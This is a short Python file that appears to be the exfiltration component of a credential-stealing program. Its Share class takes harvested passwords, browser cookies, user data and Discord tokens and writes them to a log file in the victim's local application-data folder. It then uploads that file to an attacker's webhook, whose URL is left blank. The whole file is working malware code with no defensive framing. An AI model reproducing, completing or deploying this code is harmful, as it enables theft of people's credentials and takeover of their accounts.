import requests
import os

APP_DATA = os.environ['LOCALAPPDATA']
WEB_HOOK = ""
class Share():
	def __init__(self, passwords, cookies, userdata, discord):
		self.passwords = passwords
		self.userdata = userdata
		self.discord = discord
		self.cookies = cookies
		self.logfile = f"{APP_DATA}\\logs.txt"
		self.save()
		self.webhook()


	def save(self):
		self.logger = open(self.logfile, "w")
		self.logger.write(f"============[PASSWORDS]============\n{self.passwords}\n\n============[COOKIES]============\n{self.cookies}\n============[USERDATA]============\n{self.userdata}\n\n============[DISCORD]============\n")
		for token in self.discord:
			self.logger.write(f"{token}\n")
		self.logger.flush()
		self.logger.close()

	def webhook(self):
		requests.post(WEB_HOOK, files={'upload_file': open(self.logfile,'rb')})
